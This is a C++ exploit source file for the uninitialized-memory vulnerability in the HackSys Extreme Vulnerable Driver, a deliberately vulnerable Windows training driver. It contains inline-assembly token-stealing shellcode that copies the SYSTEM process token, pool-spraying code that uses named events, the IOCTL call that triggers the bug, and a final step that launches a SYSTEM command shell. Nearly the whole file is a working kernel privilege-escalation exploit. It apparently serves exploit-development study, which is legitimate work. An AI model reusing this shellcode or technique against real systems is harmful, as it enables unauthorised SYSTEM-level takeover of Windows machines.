// HEVD_Uninitialized_Memory.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <windows.h>

#include <stdio.h>

typedef NTSTATUS(WINAPI * My_NtMapUserPhysicalPages)(
	IN PVOID          VirtualAddress,
	IN ULONG_PTR      NumberOfPages,
	IN OUT PULONG_PTR UserPfnArray);


void shellcode()
{
	_asm
	{
		//int 3
		pushad
		mov eax, fs: [124h]		// Find the _KTHREAD structure for the current thread
		mov eax, [eax + 0x50]   // Find the _EPROCESS structure
		mov ecx, eax
		mov edx, 4				// edx = system PID(4)

		// The loop is to get the _EPROCESS of the system
		find_sys_pid :
					 mov eax, [eax + 0xb8]	// Find the process activity list
					 sub eax, 0xb8    		// List traversal
					 cmp[eax + 0xb4], edx    // Determine whether it is SYSTEM based on PID
					 jnz find_sys_pid

					 // Replace the Token
					 mov edx, [eax + 0xf8]
					 mov[ecx + 0xf8], edx
					 popad
					 //int 3
					 ret
	}
}

int main()
{
	HANDLE hDevice = NULL;
	DWORD recv = NULL;

	hDevice = CreateFile("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (FAILED(hDevice))
	{
		printf("Failed to open device\n");
		return 0;
	}

	char lpName[0xf0] = {0};
	memset(lpName, 0x41, 0xf0);

	// 池喷射
	HANDLE EventList[1000] = { 0 };

	for (int i = 0; i < 256; i++)
	{
		*(PDWORD)(lpName + 0x4) = (DWORD)shellcode;
		*(PDWORD)(lpName + 0xf0 - 1) = i;
		EventList[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)lpName);
	}

	for (int i = 0; i < 256; i++)
	{
		CloseHandle(EventList[i]);
		i += 4;
	}

	//仅在非调试模式、单核、2G内存中成功利用，其他情况很可能失败。
	DWORD pointer = 0x12345678;
	DeviceIoControl(hDevice, 0x222033, &pointer, 4, NULL, NULL, &recv, NULL);

	system("start cmd.exe");
	CloseHandle(hDevice);
}
